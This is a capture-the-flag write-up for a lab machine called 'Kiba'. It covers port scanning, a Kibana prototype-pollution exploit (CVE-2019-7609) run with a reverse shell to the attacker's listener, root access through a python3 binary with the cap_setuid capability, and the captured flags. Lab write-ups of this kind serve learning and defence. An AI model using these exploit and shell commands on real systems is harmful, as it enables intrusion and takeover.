# Kiba

<img src="kiba.png" alt="kiba">

## Enumeration

### nmap

```
PORT   STATE SERVICE REASON  VERSION
22/tcp open  ssh     syn-ack OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 9d:f8:d1:57:13:24:81:b6:18:5d:04:8e:d2:38:4f:90 (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDdVrdscXW6Eaq1+q+MgEBuU8ngjH5elzu6EOX2UJzNKcvAgxLrV0gCtWb4dJiJ2TyCLmA5lr0+8/TCInbcNfvXbmMEjxv0H3mi4Wjc/6wLECBXmEBvPX/SUyxPQb9YusTj70qGxgyI6SCB13TKftGeHOn2YRGLkudRF5ptIWYZqRnwlmYDWvuEBotWyUpfC1fGEnk7iH6gr3XJ8pwhY8wOojWaXEPsSZux3iBO52GuHILC14OiR/rQz9jxsq4brm6Zk/RhPCt1Ct/5ytsPzmUi7Nvwz6UoR6AeSRSHxOCnNBRQc2+5tFY7JMBBtvOFtbASOleILHkmTJBuRK3jth5D
|   256 e1:e6:7a:a1:a1:1c:be:03:d2:4e:27:1b:0d:0a:ec:b1 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBD2fQ/bb8Gwa5L5++T3T5JC7ZvciybYTlcWE9Djbzuco0f86gp3GOzTeVaDuhOWkR6J3fwxxwDWPk6k7NacceG0=
|   256 2a:ba:e5:c5:fb:51:38:17:45:e7:b1:54:ca:a1:a3:fc (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIJk7PJIcjNmxjQK6/M1zKyptfTrUS2l0ZsELrO3prOA0

80/tcp open  http    syn-ack Apache httpd 2.4.18 ((Ubuntu))
|_http-title: Site doesn't have a title (text/html).
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: Apache/2.4.18 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

5044/tcp open  lxi-evntsvc? syn-ack

5601/tcp open  esmagent?    syn-ack
| fingerprint-strings: 
|   DNSStatusRequestTCP, DNSVersionBindReqTCP, Help, Kerberos, LDAPBindReq, LDAPSearchReq, LPDString, RPCCheck, RTSPRequest, SIPOptions, SMBProgNeg, SSLSessionReq, TLSSessionReq, TerminalServerCookie, X11Probe: 
|     HTTP/1.1 400 Bad Request
|   FourOhFourRequest: 
|     HTTP/1.1 404 Not Found
|     kbn-name: kibana
|     kbn-xpack-sig: c4d007a8c4d04923283ef48ab54e3e6c
|     content-type: application/json; charset=utf-8
|     cache-control: no-cache
|     content-length: 60
|     connection: close
|     Date: Wed, 23 Feb 2022 19:50:56 GMT
|     {"statusCode":404,"error":"Not Found","message":"Not Found"}
|   GetRequest: 
|     HTTP/1.1 302 Found
|     location: /app/kibana
|     kbn-name: kibana
|     kbn-xpack-sig: c4d007a8c4d04923283ef48ab54e3e6c
|     cache-control: no-cache
|     content-length: 0
|     connection: close
|     Date: Wed, 23 Feb 2022 19:50:51 GMT
|   HTTPOptions: 
|     HTTP/1.1 404 Not Found
|     kbn-name: kibana
|     kbn-xpack-sig: c4d007a8c4d04923283ef48ab54e3e6c
|     content-type: application/json; charset=utf-8
|     cache-control: no-cache
|     content-length: 38
|     connection: close
|     Date: Wed, 23 Feb 2022 19:50:51 GMT
|_    {"statusCode":404,"error":"Not Found"}
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port5601-TCP:V=7.92%I=7%D=2/23%Time=62168F70%P=x86_64-pc-linux-gnu%r(Ge
SF:tRequest,D4,"HTTP/1\.1\x20302\x20Found\r\nlocation:\x20/app/kibana\r\nk
SF:bn-name:\x20kibana\r\nkbn-xpack-sig:\x20c4d007a8c4d04923283ef48ab54e3e6
SF:c\r\ncache-control:\x20no-cache\r\ncontent-length:\x200\r\nconnection:\
SF:x20close\r\nDate:\x20Wed,\x2023\x20Feb\x202022\x2019:50:51\x20GMT\r\n\r
SF:\n")%r(HTTPOptions,117,"HTTP/1\.1\x20404\x20Not\x20Found\r\nkbn-name:\x
SF:20kibana\r\nkbn-xpack-sig:\x20c4d007a8c4d04923283ef48ab54e3e6c\r\nconte
SF:nt-type:\x20application/json;\x20charset=utf-8\r\ncache-control:\x20no-
SF:cache\r\ncontent-length:\x2038\r\nconnection:\x20close\r\nDate:\x20Wed,
SF:\x2023\x20Feb\x202022\x2019:50:51\x20GMT\r\n\r\n{\"statusCode\":404,\"e
SF:rror\":\"Not\x20Found\"}")%r(RTSPRequest,1C,"HTTP/1\.1\x20400\x20Bad\x2
SF:0Request\r\n\r\n")%r(RPCCheck,1C,"HTTP/1\.1\x20400\x20Bad\x20Request\r\
SF:n\r\n")%r(DNSVersionBindReqTCP,1C,"HTTP/1\.1\x20400\x20Bad\x20Request\r
SF:\n\r\n")%r(DNSStatusRequestTCP,1C,"HTTP/1\.1\x20400\x20Bad\x20Request\r
SF:\n\r\n")%r(Help,1C,"HTTP/1\.1\x20400\x20Bad\x20Request\r\n\r\n")%r(SSLS
SF:essionReq,1C,"HTTP/1\.1\x20400\x20Bad\x20Request\r\n\r\n")%r(TerminalSe
SF:rverCookie,1C,"HTTP/1\.1\x20400\x20Bad\x20Request\r\n\r\n")%r(TLSSessio
SF:nReq,1C,"HTTP/1\.1\x20400\x20Bad\x20Request\r\n\r\n")%r(Kerberos,1C,"HT
SF:TP/1\.1\x20400\x20Bad\x20Request\r\n\r\n")%r(SMBProgNeg,1C,"HTTP/1\.1\x
SF:20400\x20Bad\x20Request\r\n\r\n")%r(X11Probe,1C,"HTTP/1\.1\x20400\x20Ba
SF:d\x20Request\r\n\r\n")%r(FourOhFourRequest,12D,"HTTP/1\.1\x20404\x20Not
SF:\x20Found\r\nkbn-name:\x20kibana\r\nkbn-xpack-sig:\x20c4d007a8c4d049232
SF:83ef48ab54e3e6c\r\ncontent-type:\x20application/json;\x20charset=utf-8\
SF:r\ncache-control:\x20no-cache\r\ncontent-length:\x2060\r\nconnection:\x
SF:20close\r\nDate:\x20Wed,\x2023\x20Feb\x202022\x2019:50:56\x20GMT\r\n\r\
SF:n{\"statusCode\":404,\"error\":\"Not\x20Found\",\"message\":\"Not\x20Fo
SF:und\"}")%r(LPDString,1C,"HTTP/1\.1\x20400\x20Bad\x20Request\r\n\r\n")%r
SF:(LDAPSearchReq,1C,"HTTP/1\.1\x20400\x20Bad\x20Request\r\n\r\n")%r(LDAPB
SF:indReq,1C,"HTTP/1\.1\x20400\x20Bad\x20Request\r\n\r\n")%r(SIPOptions,1C
SF:,"HTTP/1\.1\x20400\x20Bad\x20Request\r\n\r\n");

```
### gobuster

```
/.hta                 (Status: 403) [Size: 277]
/.htaccess            (Status: 403) [Size: 277]
/.htpasswd            (Status: 403) [Size: 277]
/index.html           (Status: 200) [Size: 1291]
/server-status        (Status: 403) [Size: 277] 

```
Seems like there will be `prototype pollution` involved?

The website says `Welcome, "linux capabilities" is very interesting.`

After some google we discover it's something that can be used to leverage priviledges

We move to the `kibana` app on port `5601` next

The version number can be found in `management` section

using Google for the cve and exploit I found [this article](https://research.securitum.com/prototype-pollution-rce-kibana-cve-2019-7609/)

Understand and follow the steps to get access

Or just use the [script](https://github.com/LandGrey/CVE-2019-7609/)

```
└──╼ $python2 exploit.py -u http://10.10.99.205:5601 -host 10.8.226.203 -port 4444 --shell 
[+] http://10.10.99.205:5601 maybe exists CVE-2019-7609 (kibana < 6.6.1 RCE) vulnerability
[+] reverse shell completely! please check session on: 10.8.226.203:4444
```

```
└──╼ $nc -lnvp 4444
listening on [any] 4444 ...
connect to [10.0.2.15] from (UNKNOWN) [10.0.2.2] 50330
bash: cannot set terminal process group (954): Inappropriate ioctl for device
bash: no job control in this shell
To run a command as administrator (user "root"), use "sudo <command>".
See "man sudo_root" for details.

kiba@ubuntu:/home/kiba/kibana/bin$ ls
ls
kibana
kibana-keystore
kibana-plugin
```
Get user flag

```
kiba@ubuntu:/home/kiba/kibana/bin$ cd ../../
cd ../../
kiba@ubuntu:/home/kiba$ ls -al
ls -al
total 110664
drwxr-xr-x  6 kiba kiba      4096 Mar 31  2020 .
drwxr-xr-x  3 root root      4096 Mar 31  2020 ..
-rw-------  1 kiba kiba      9605 Mar 31  2020 .bash_history
-rw-r--r--  1 kiba kiba       220 Mar 31  2020 .bash_logout
-rw-r--r--  1 kiba kiba      3771 Mar 31  2020 .bashrc
drwx------  2 kiba kiba      4096 Mar 31  2020 .cache
drwxrwxr-x  2 kiba kiba      4096 Mar 31  2020 .hackmeplease
drwxrwxr-x  2 kiba kiba      4096 Mar 31  2020 .nano
-rw-r--r--  1 kiba kiba       655 Mar 31  2020 .profile
-rw-r--r--  1 kiba kiba         0 Mar 31  2020 .sudo_as_admin_successful
-rw-r--r--  1 root root       176 Mar 31  2020 .wget-hsts
-rw-rw-r--  1 kiba kiba 113259798 Dec 19  2018 elasticsearch-6.5.4.deb
drwxrwxr-x 11 kiba kiba      4096 Dec 17  2018 kibana
-rw-rw-r--  1 kiba kiba        35 Mar 31  2020 user.txt
kiba@ubuntu:/home/kiba$ cat user.txt
cat user.txt
THM{k1bana_rc3_f0r_pr0s}


```

## Privilege escalation

Ok now we are back to `linux capabilities`

use google! and read some [articles](https://book.hacktricks.xyz/linux-unix/privilege-escalation/linux-capabilities)

```
kiba@ubuntu:/home/kiba$ getcap -r / 2>/dev/null
getcap -r / 2>/dev/null
/home/kiba/.hackmeplease/python3 = cap_setuid+ep
/usr/bin/mtr = cap_net_raw+ep
/usr/bin/traceroute6.iputils = cap_net_raw+ep
/usr/bin/systemd-detect-virt = cap_dac_override,cap_sys_ptrace+ep
```
It feels like SUID with extra steps

python3 would be my first choice

wait! GTFObins have exploits for "capabilities" too!

```
kiba@ubuntu:/home/kiba$ /home/kiba/.hackmeplease/python3 -c 'import os; os.setuid(0); os.system("/bin/sh")'
<on3 -c 'import os; os.setuid(0); os.system("/bin/sh")'                      
id
uid=0(root) gid=1000(kiba) groups=1000(kiba),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),114(lpadmin),115(sambashare)
```
Cool! now let's get rewarded

```
cd /root
ls
root.txt
ufw
cat root.txt
THM{l1nux_c4pab1lit1es_f0r_n00bs}
```
Nice one! I learnt something new here!

